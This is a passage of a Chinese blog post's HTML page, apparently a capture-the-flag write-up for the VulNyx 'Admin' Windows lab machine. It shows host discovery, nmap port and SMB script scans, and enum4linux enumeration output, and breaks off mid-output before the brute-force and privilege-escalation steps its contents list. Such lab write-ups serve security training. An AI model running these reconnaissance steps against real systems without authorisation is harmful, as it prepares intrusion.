@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulNyx - Admin">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/12/16/VulNyx%20-%20Admin/index.html">
+<meta property="og:site_name" content="Phantom&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-12-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-16T10:38:05.758Z">
+<meta property="article:author" content="Phantom">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="反弹 shell">
+<meta property="article:tag" content="SMB">
+<meta property="article:tag" content="crackmapexec">
+<meta property="article:tag" content="RunasCs">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="WinRM">
+<meta property="article:tag" content="Evil-Winrm">
+<meta property="article:tag" content="VulNyx">
+<meta property="article:tag" content="winPEAS">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/12/16/VulNyx%20-%20Admin/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/12/16/VulNyx%20-%20Admin/","path":"2024/12/16/VulNyx - Admin/","title":"VulNyx - Admin"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VulNyx - Admin | Phantom's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Phantom's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1. 主机探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">2. 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smb-%E6%89%AB%E6%8F%8F"><span class="nav-text">3. SMB 扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">4. Web 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smb-%E7%88%86%E7%A0%B4"><span class="nav-text">5. SMB 爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#winrm-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86"><span class="nav-text">6. WinRM 远程管理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">7. 提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%A1%A5%E5%85%85"><span class="nav-text">8. 提权补充</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Phantom"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Phantom</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">180</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">168</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/12/16/VulNyx%20-%20Admin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Phantom">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phantom's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="VulNyx - Admin | Phantom's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulNyx - Admin
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-12-16 00:00:00 / 修改时间：18:38:05" itemprop="dateCreated datePublished" datetime="2024-12-16T00:00:00+08:00">2024-12-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>14 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a target="_blank" rel="noopener" href="https://vulnyx.com/">VulNyx: Free Cybersecurity
+Platform | Enthusiasts &amp; Professionals</a></p>
+</blockquote>
+<h2 id="主机探测">1. 主机探测</h2>
+<p>示例</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 10.0.3.0/24</span><br></pre></td></tr></table></figure>
+<p>靶机：10.0.3.33</p>
+<h2 id="端口扫描">2. 端口扫描</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV -sC 10.0.3.33 -p-     </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 21:28 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.33</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Not shown: 65520 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: IIS Windows</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">5040/tcp  open  unknown</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">7680/tcp  open  pando-pub?</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49670/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">MAC Address: 08:00:27:C6:80:2F (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: ADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:c6:80:2f (Oracle VirtualBox virtual NIC)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-12-16T08:31:22</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: 5h59m58s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 211.43 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="smb-扫描">3. SMB 扫描</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap --script &quot;safe or smb-enum-*&quot; 10.0.3.33 -p 445 -e eth1 </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 21:33 EST</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| eap-info: </span><br><span class="line">| Available authentication methods with identity=<span class="string">&quot;anonymous&quot;</span> on interface eth1</span><br><span class="line">|   unknown  EAP-TTLS</span><br><span class="line">|   unknown  EAP-TLS</span><br><span class="line">|   unknown  EAP-MSCHAP-V2</span><br><span class="line">|_  unknown  PEAP</span><br><span class="line">| targets-asn: </span><br><span class="line">|_  targets-asn.asn is a mandatory parameter</span><br><span class="line">|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes <span class="keyword">in</span> Robtex<span class="string">&#x27;s API. See https://www.robtex.com/api/</span></span><br><span class="line"><span class="string">| broadcast-igmp-discovery: </span></span><br><span class="line"><span class="string">|   10.0.3.33</span></span><br><span class="line"><span class="string">|     Interface: eth1</span></span><br><span class="line"><span class="string">|     Version: 2</span></span><br><span class="line"><span class="string">|     Group: 224.0.0.251</span></span><br><span class="line"><span class="string">|     Description: mDNS (rfc6762)</span></span><br><span class="line"><span class="string">|   10.0.3.33</span></span><br><span class="line"><span class="string">|     Interface: eth1</span></span><br><span class="line"><span class="string">|     Version: 2</span></span><br><span class="line"><span class="string">|     Group: 239.255.255.250</span></span><br><span class="line"><span class="string">|     Description: Organization-Local Scope (rfc2365)</span></span><br><span class="line"><span class="string">|_  Use the newtargets script-arg to add the results as targets</span></span><br><span class="line"><span class="string">|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex&#x27;</span>s API. See https://www.robtex.com/api/</span><br><span class="line">| targets-sniffer: Sniffed 12 address(es). </span><br><span class="line">| 224.0.0.9</span><br><span class="line">| 10.0.3.33</span><br><span class="line">| 224.0.0.252</span><br><span class="line">| 239.255.255.253</span><br><span class="line">| 224.0.0.251</span><br><span class="line">| 239.255.255.250</span><br><span class="line">| 10.0.3.3</span><br><span class="line">| 224.0.0.13</span><br><span class="line">| 0.0.0.0</span><br><span class="line">| 224.0.0.1</span><br><span class="line">| 192.168.1.1</span><br><span class="line">|_224.0.23.12</span><br><span class="line">| broadcast-dhcp-discover: </span><br><span class="line">|   Response 1 of 1: </span><br><span class="line">|     Interface: eth1</span><br><span class="line">|     IP Offered: 10.0.3.37</span><br><span class="line">|     Server Identifier: 10.0.3.3</span><br><span class="line">|     Subnet Mask: 255.255.255.0</span><br><span class="line">|     Router: 10.0.3.1</span><br><span class="line">|_    Domain Name Server: 192.168.1.1</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.33</span><br><span class="line">Host is up (0.0017s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">|_smb-enum-services: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">MAC Address: 08:00:27:C6:80:2F (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_fcrdns: FAIL (No PTR record)</span><br><span class="line">|_path-mtu: PMTU == 1500</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-12-16T08:34:22</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| dns-blacklist: </span><br><span class="line">|   ATTACK</span><br><span class="line">|     all.bl.blocklist.de - FAIL</span><br><span class="line">|   SPAM</span><br><span class="line">|     sbl.spamhaus.org - FAIL</span><br><span class="line">|     l2.apews.org - FAIL</span><br><span class="line">|     spam.dnsbl.sorbs.net - FAIL</span><br><span class="line">|     bl.nszones.com - FAIL</span><br><span class="line">|     all.spamrats.com - FAIL</span><br><span class="line">|     list.quorum.to - FAIL</span><br><span class="line">|     bl.spamcop.net - FAIL</span><br><span class="line">|     dnsbl.inps.de - FAIL</span><br><span class="line">|   PROXY</span><br><span class="line">|     http.dnsbl.sorbs.net - FAIL</span><br><span class="line">|     socks.dnsbl.sorbs.net - FAIL</span><br><span class="line">|     tor.dan.me.uk - FAIL</span><br><span class="line">|     dnsbl.tornevall.org - FAIL</span><br><span class="line">|_    misc.dnsbl.sorbs.net - FAIL</span><br><span class="line">|_ipidseq: Unknown</span><br><span class="line">| port-states: </span><br><span class="line">|   tcp: </span><br><span class="line">|_    open: 445</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_nbstat: NetBIOS name: ADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:c6:80:2f (Oracle VirtualBox virtual NIC)</span><br><span class="line">| smb2-capabilities: </span><br><span class="line">|   2:0:2: </span><br><span class="line">|     Distributed File System</span><br><span class="line">|   2:1:0: </span><br><span class="line">|     Distributed File System</span><br><span class="line">|     Leasing</span><br><span class="line">|     Multi-credit operations</span><br><span class="line">|   3:0:0: </span><br><span class="line">|     Distributed File System</span><br><span class="line">|     Leasing</span><br><span class="line">|     Multi-credit operations</span><br><span class="line">|   3:0:2: </span><br><span class="line">|     Distributed File System</span><br><span class="line">|     Leasing</span><br><span class="line">|     Multi-credit operations</span><br><span class="line">|   3:1:1: </span><br><span class="line">|     Distributed File System</span><br><span class="line">|     Leasing</span><br><span class="line">|_    Multi-credit operations</span><br><span class="line">| smb-protocols: </span><br><span class="line">|   dialects: </span><br><span class="line">|     2:0:2</span><br><span class="line">|     2:1:0</span><br><span class="line">|     3:0:0</span><br><span class="line">|     3:0:2</span><br><span class="line">|_    3:1:1</span><br><span class="line">|_msrpc-enum: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span><br><span class="line">|_clock-skew: 5h59m58s</span><br><span class="line">| smb-mbenum: </span><br><span class="line">|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span><br><span class="line">| unusual-port: </span><br><span class="line">|_  WARNING: this script depends on Nmap<span class="string">&#x27;s service/version detection (-sV)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Post-scan script results:</span></span><br><span class="line"><span class="string">| reverse-index: </span></span><br><span class="line"><span class="string">|_  445/tcp: 10.0.3.33</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 97.52 seconds</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~/Desktop]</span></span><br><span class="line"><span class="string">└─# enum4linux -a 10.0.3.33</span></span><br><span class="line"><span class="string">Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Dec 15 21:36:33 2024</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> =========================================( Target Information )=========================================</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">Target ........... 10.0.3.33                                                                                                                                                                                                                </span></span><br><span class="line"><span class="string">RID Range ........ 500-550,1000-1050</span></span><br><span class="line"><span class="string">Username ......... &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">Password ......... &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> =============================( Enumerating Workgroup/Domain on 10.0.3.33 )=============================</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">[+] Got domain/workgroup name: WORKGROUP                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string"> =================================( Nbtstat Information for 10.0.3.33 )=================================</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">Looking up status of 10.0.3.33                                                                                                                                                                                                              </span></span><br><span class="line"><span class="string">        ADMIN           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span></span><br><span class="line"><span class="string">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span></span><br><span class="line"><span class="string">        ADMIN           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        MAC Address = 08-00-27-C6-80-2F</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> =====================================( Session Check on 10.0.3.33 )=====================================</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">[E] Server doesn&#x27;</span>t allow session using username <span class="string">&#x27;&#x27;</span>, password <span 